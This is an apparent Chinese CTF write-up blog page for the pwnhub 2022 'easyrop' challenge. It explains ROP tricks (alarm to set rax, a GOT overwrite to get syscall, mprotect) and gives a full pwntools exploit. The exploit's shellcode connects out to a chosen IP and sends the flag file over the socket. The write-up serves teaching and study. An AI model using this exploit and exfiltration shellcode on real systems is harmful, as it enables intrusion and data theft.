@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="来自pwnhub春季赛的一道题目，比赛的时候看了，完全没有思路。赛后复现发现题目确实很复杂。但是也学到了非常多。包括：能够任意地址写的magic，反向shell，alarm设置rax，构造syscall指令的方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnhub2022_easyrop">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="来自pwnhub春季赛的一道题目，比赛的时候看了，完全没有思路。赛后复现发现题目确实很复杂。但是也学到了非常多。包括：能够任意地址写的magic，反向shell，alarm设置rax，构造syscall指令的方法。">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427143615956.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427143836630.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427143929904.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427144457532.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427145207754.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427145329461.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427150610764.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427153218710.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427164128901.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427165707253.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427212817318.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427160338128.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427161512739.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427161443802.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427171103873.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427185420778.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427213159616.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427212202690.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427212635790.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427145207754.png">
+<meta property="article:published_time" content="2022-04-27T06:35:35.000Z">
+<meta property="article:modified_time" content="2022-04-27T13:55:22.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220427143615956.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>pwnhub2022_easyrop | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-pwnhub2022" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/27/pwnhub2022/" class="article-date">
+      <time datetime="2022-04-27T06:35:35.000Z" itemprop="datePublished">2022-04-27</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwnhub2022_easyrop
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>来自pwnhub春季赛的一道题目，比赛的时候看了，完全没有思路。赛后复现发现题目确实很复杂。但是也学到了非常多。包括：能够任意地址写的magic，反向shell，alarm设置rax，构造syscall指令的方法。</p>
+<span id="more"></span>
+
+<h1 id="easyrop"><a href="#easyrop" class="headerlink" title="easyrop"></a>easyrop</h1><p>逻辑很简单，只不过关了输入输出流。</p>
+<p><img src="/.io//image-20220427143615956.png" alt="image-20220427143615956"></p>
+<p>当时一开始看到的想法是，这个直接重新打开输出流不就完事了?但是可能没有这种选项。</p>
+<p><img src="/.io//image-20220427143836630.png" alt="image-20220427143836630"></p>
+<p>(这里竟然能被检查出来canary也真是醉了…</p>
+<p>同时，题目开了沙箱。也就是允许正规的ORW。但是无法输出</p>
+<p><img src="/.io//image-20220427143929904.png" alt="image-20220427143929904"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>基本想法肯定是ORW。如果不能本地读取，看了wp之后发现还有一种方法，就是自己开一个socket然后在公网服务器上读。这牵涉到很多rop的gardet。因此需要考虑是否有可能把某部分映射成为可执行，也就是调用mprotect。但是怎么控制rax呢？</p>
+<p>这道题给了一个新的思路。以前是通过read返回值可以设置rax，这里<strong>通过将alarm重新设置为0也就是alarm(0)时，会返回没有结束的秒数到寄存器rax中。利用这个特性我们可以获得一个0xf以下的rax。</strong></p>
+<p>因此，可以等待5秒，然后调用alarm(0)，得到eax为10，然后利用ret2csu执行mprotect(bss, 0x1000, 7)。</p>
+<p><img src="/.io//image-20220427144457532.png" alt="image-20220427144457532"></p>
+<p>可以看到这里正好有mprotect这个系统调用，也符合我们写汇编代码的需求。于是我们可以把堆映射为可执行的，从而调一个socket，在公网上完成读flag。</p>
+<p>但是，进一步发现，我们并没有<code>syscall;ret</code>的gardet。这似乎就没法调用mprotect了。</p>
+<p>答案中给出了一个神奇的办法。注意到下面这个gardet。</p>
+<p><code>add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret</code>是一般的binary都有的。他的opcode是<code>015dc3</code>。</p>
+<p><img src="/.io//image-20220427145207754.png" alt="image-20220427145207754"></p>
+<p>通过以上的gardet，结合ret2csu的gardet。我们就可以<strong>实现一个任意地址写的rop链</strong>。这是一个神奇的操作。而且在一般的binary里面基本都有！</p>
+<p><img src="/.io//image-20220427145329461.png" alt="image-20220427145329461"></p>
+<p>通过这个rop链，我们可以把alarm的got表改成<code>syscall</code>。具体来说如下图所示。我们把alarm的got表的内容(下图中0x00007ffff7e9fd90)改成0x00007ffff7e9fd99即可。</p>
+<p><img src="/.io//image-20220427150610764.png" alt="image-20220427150610764"></p>
+<p>只要把这个修改了，我们就能创造出一个<code>syscall ret</code>的gadget。</p>
+<p>然而，也不是这么容易调用mprotect。因为我们没有pop rdx的gardet。不过我们可以用ret2csu来解决。注意到下面的mov rdx,r15可以用来解决这个问题。</p>
+<p><img src="/.io//image-20220427153218710.png" alt="image-20220427153218710"></p>
+<p>最后。(这个算是一个补充知识)，使用rep的时候(因为我们需要把输入转移到堆上)各个寄存器放什么。如下图，是把esi移动到edi中。</p>
+<p><img src="/.io//image-20220427164128901.png" alt="image-20220427164128901"></p>
+<p>因此，整理一下思路。</p>
+<h3 id="思路的总结"><a href="#思路的总结" class="headerlink" title="思路的总结"></a>思路的总结</h3><ol>
+<li>等待五秒，调用<code>alarm(0)</code>，这里可以直接使用csu来调用。</li>
+<li>上一步结束之后，应该能使得eax变为10(mprotect)，先修改alarm的got表里面改成syscall，之后利用这个syscall结合ret2csu完成一个mprotect修改特定位置的权限。这里选择修改堆为可执行。</li>
+<li>在堆上写好一些rep要用到的指令。包括<code>pop rbp rbx rcx</code>(用于magic方法)、<code>mov rsi rsp ret</code>（用于rep）、<code>rep movs</code>，就是rep，后面在栈上就可以直接使用。注意这里要直接写入16进制的指令数值。用下面的方法</li>
+</ol>
+<p><img src="/.io//image-20220427165707253.png" alt="image-20220427165707253"></p>
+<ol start="4">
+<li>在栈上写好shellcode，主要是socket+connect+sendfile，使用rep把shellcode拷贝到bss段执行(需要提前在堆上构造一些rep使用所需要的指令)。因为如果不用rep，就要使用上面提到的gardet，可能导致长度不够的问题。</li>
+<li>跳转到堆上执行shellcode</li>
+</ol>
+<p>调试过程十分复杂，光复现就花了五个小时…</p>
+<h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><h3 id="修改alarm"><a href="#修改alarm" class="headerlink" title="修改alarm"></a>修改alarm</h3><p>修改alarm为syscall。能够实现的原因是用那个magic能够控制任意地址加上一个任意数值。然后alarm在libc里面的内容里面有syscall。因此我们直接把地址加上这么多即可。</p>
+<p><img src="/.io//image-20220427212817318.png" alt="image-20220427212817318"></p>
+<p>下面是改掉之后的结果。</p>
+<p><img src="/.io//image-20220427160338128.png" alt="image-20220427160338128"></p>
+<h3 id="调用mprotect"><a href="#调用mprotect" class="headerlink" title="调用mprotect"></a>调用mprotect</h3><p>可以看到这里的参数，以及最后的alarm+9的内容。</p>
+<p><img src="/.io//image-20220427161512739.png" alt="image-20220427161512739"></p>
+<p>我们把堆映射为RWX的。</p>
+<p><img src="/.io//image-20220427161443802.png" alt="image-20220427161443802"></p>
+<h3 id="寻找相关汇编"><a href="#寻找相关汇编" class="headerlink" title="寻找相关汇编"></a>寻找相关汇编</h3><p>下面这个rep的好难找，真的要自己输入这样的指令。算是借此学到了吧，因为网上真的查不到这样的指令。下面指令的意思是把rsi指针中的数据中内容复制到rdi指针中。(类似于字符串拷贝的汇编)一次拷贝8byte。<strong>拷贝总次数由rcx决定</strong>。是和rep配合起来使用的。</p>
+<p><img src="/.io//image-20220427171103873.png" alt="image-20220427171103873"></p>
+<h3 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h3><p>一共用到三个系统调用。第一个是本地创建一个socket，用来后续bind。</p>
+<p>第二个是connect，相当于这个socket连接到addr指针中的ip地址和端口(到这里大概明白了为什么要公网IP，因为打远程的时候远程的binary没发链接到自己的虚拟机上，自己的虚拟机本地调试的时候，这里可以在本地监听)</p>
+<p>第三个是sendfile。其中out_fd表示输出到什么文件,in_fd表示从什么文件读。这里我先开的socket，再打开的文件，所以是下面的顺序。offset就不用管了，直接写0，最后是长度。</p>
+<p><img src="/.io//image-20220427185420778.png" alt="image-20220427185420778"></p>
+<p><img src="/.io//image-20220427213159616.png" alt="image-20220427213159616"></p>
+<p><img src="/.io//image-20220427212202690.png" alt="image-20220427212202690"></p>
+<h3 id="最终反向shell拿到flag"><a href="#最终反向shell拿到flag" class="headerlink" title="最终反向shell拿到flag"></a>最终反向shell拿到flag</h3><p><img src="/.io//image-20220427212635790.png" alt="image-20220427212635790"></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>首先上一个完整的exp。当本地打开127.0.0.1:10001端口监听之后，可以获得一个flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">filename=<span class="string">&quot;./easyrop&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">remote_port = <span class="number">10001</span></span><br><span class="line">remote_ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_shell = <span class="string">b&quot;\x6a\x29\x58\x6a\x06\x5a\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00&quot;</span>+ \</span><br><span class="line">    remote_port.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)+socket.inet_aton(remote_ip) + <span class="string">b&quot;\x51\x54\x5e\xb2\x10\x0f\x05&quot;</span></span><br><span class="line">send_flag = <span class="string">b&#x27;\xe8\x05\x00\x00\x00flag\x00_H\x89\xd0H1\xd21\xf6\xb0\x02\x0f\x05H\xc7\xc0(\x00\x00\x00H1\xffH\xc7\xc6\x01\x00\x00\x00H1\xd2I\xc7\xc20\x00\x00\x00\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment"># send_flag = b&quot;\x92\x48\xbb\x2f\x66\x6c\x61\x67\x00\x00\x00\x53\x54\x5f\x31\xf6\xb0\x02\x0f\x05\x96\x87\xfa\x68\x00\x13\x60\x00\x5a\x6a\x30\x41\x5a\x31\xc0\xb0\x28\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x0000000000400618</span> <span class="comment"># add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret, arbitary write</span></span><br><span class="line">csu = <span class="number">0x4008FA</span> <span class="comment"># pop rbx, pop rbp, pop 4, ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400903</span> <span class="comment"># pop rdi</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400901</span> <span class="comment"># pop rsi,r15,ret</span></span><br><span class="line">pop_rbp_rbx_rcx_ret = <span class="number">0x601500</span></span><br><span class="line">mov_rsi_rsp_ret = <span class="number">0x601600</span></span><br><span class="line">rep_movs = <span class="number">0x601650</span></span><br><span class="line">shellcode_addr = <span class="number">0x601700</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for 5 seconds</span></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call alarm(0) to get a 10 in eax</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;alarm&#x27;</span>]) <span class="comment"># call alarm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># use magic to change alarm&#x27;s got</span></span><br><span class="line">payload +=p64(csu)</span><br><span class="line">payload +=p64(<span class="number">0x09090909</span>)<span class="comment"># notice: here is add</span></span><br><span class="line">payload +=p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>]+<span class="number">0x3d</span>-<span class="number">3</span>) <span class="comment"># we only need to change 1 byte, so -3 here</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># fill rest r*</span></span><br><span class="line">payload +=p64(magic)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call mprotect, with eax = 10 and syscall gardet</span></span><br><span class="line"><span class="comment"># using ret2csu, with call alarm&#x27;s got == syscall</span></span><br><span class="line">payload +=p64(csu)</span><br><span class="line">payload +=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload +=p64(<span class="number">1</span>) <span class="comment"># rbp</span></span><br><span class="line">payload +=p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>]) <span class="comment"># r12, r12+rbx*8</span></span><br><span class="line">payload +=p64(<span class="number">0x601000</span>) <span class="comment"># r13---&gt; rdi, addr, is bss</span></span><br><span class="line">payload +=p64(<span class="number">0x1000</span>) <span class="comment">#r14---&gt;rsi, length</span></span><br><span class="line">payload +=p64(<span class="number">7</span>) <span class="comment"># r15 --- &gt; rdx, mode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the call part of ret2csu</span></span><br><span class="line">payload +=p64(<span class="number">0x4008E0</span>)</span><br><span class="line"><span class="comment"># now we have successfully mprotexted an addr, form gardet1</span></span><br><span class="line">payload +=p64(<span class="number">0</span>) <span class="comment"># junk</span></span><br><span class="line">payload +=p64(<span class="number">0xc3595b5d</span>) <span class="comment">#pop_rbp_rbx_rcx_ret&#x27;s machine code, rbx content</span></span><br><span class="line">payload +=p64(pop_rbp_rbx_rcx_ret+<span class="number">0x3d</span>) <span class="comment"># rbp place</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload +=p64(magic) <span class="comment"># write to heap</span></span><br><span class="line"><span class="comment"># form gardet2</span></span><br><span class="line">payload +=p64(pop_rbp_rbx_rcx_ret)</span><br><span class="line">payload +=p64(mov_rsi_rsp_ret+<span class="number">0x3d</span>) <span class="comment">#place</span></span><br><span class="line">payload +=p64(<span class="number">0xc3e68948</span>) <span class="comment"># mov_rsi_rsp_ret</span></span><br><span class="line">payload +=p64(<span class="number">0</span>) <span class="comment"># junk</span></span><br><span class="line">payload +=p64(magic)</span><br><span class="line"><span class="comment"># form gardet3</span></span><br><span class="line">payload +=p64(pop_rbp_rbx_rcx_ret)</span><br><span class="line">payload +=p64(rep_movs+<span class="number">0x3d</span>)</span><br><span class="line">payload +=p64(<span class="number">0xc3a548f3</span>) <span class="comment"># rep movs QWORD PTR es:[rdi], QWORD PTR ds:[rsi]; ret</span></span><br><span class="line">payload +=p64(<span class="number">15</span>) <span class="comment"># rcx=copy times:15</span></span><br><span class="line">payload +=p64(magic)</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy start</span></span><br><span class="line">payload +=p64(pop_rdi)</span><br><span class="line">payload +=p64(shellcode_addr-<span class="number">0x10</span>) <span class="comment"># target addr</span></span><br><span class="line">payload +=p64(mov_rsi_rsp_ret) <span class="comment"># notice : must give rsp(the pointer) to rsi</span></span><br><span class="line">payload +=p64(rep_movs) <span class="comment"># start copy</span></span><br><span class="line">payload +=p64(shellcode_addr) <span class="comment"># execute addr!</span></span><br><span class="line">payload +=reverse_shell</span><br><span class="line">payload +=send_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x4008fa&quot;</span>) <span class="comment"># at ret in csu to avoid alarm&#x27;s time</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>下面是socket和connect。注意不需要编写汇编，直接用下面给好的字节码就能成功。字节码里面remote_port和remote_ip填自己公网的ip和port。(已验证可以成功，<strong>注意调试的时候碰到push rsp之后需要用si而不是ni</strong>，否则会失败)</p>
